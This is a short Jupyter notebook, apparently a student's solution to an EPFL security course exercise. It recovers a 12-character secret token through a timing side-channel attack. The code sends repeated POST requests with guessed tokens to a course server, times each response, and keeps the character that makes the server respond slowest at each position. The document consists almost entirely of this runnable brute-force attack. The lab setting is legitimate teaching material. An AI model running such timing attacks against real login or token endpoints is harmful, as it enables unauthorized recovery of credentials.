```python
import requests
import json
import time
import numpy as np
import jupyternotify
%reload_ext jupyternotify
url =  'http://com402.epfl.ch/hw5/ex3'
```

```python
import string
data = string.punctuation + string.ascii_letters + string.digits
```

```python
# len is 12
```

```python
%%notify
accu = []
timerecord = []
for i in range(12):
    times = np.zeros((10, len(data)))
    for j in range(10):
        for t in range(len(data)):
            token = ''.join(accu) + data[t] + (12 - i - 1) * 'a'
#             print(token)
            email_token = {'email':'fengyu.cai@epfl.ch', 'token':token}
            start = time.time()
            r = requests.post(url, json=json.loads(json.dumps(email_token)))
            time_used = time.time() - start
            times[j, t] = time_used
    accu.append(data[np.argmax(np.sum(times, axis=0))])
    timerecord.append(times)
    print(accu)
    print(times)
```
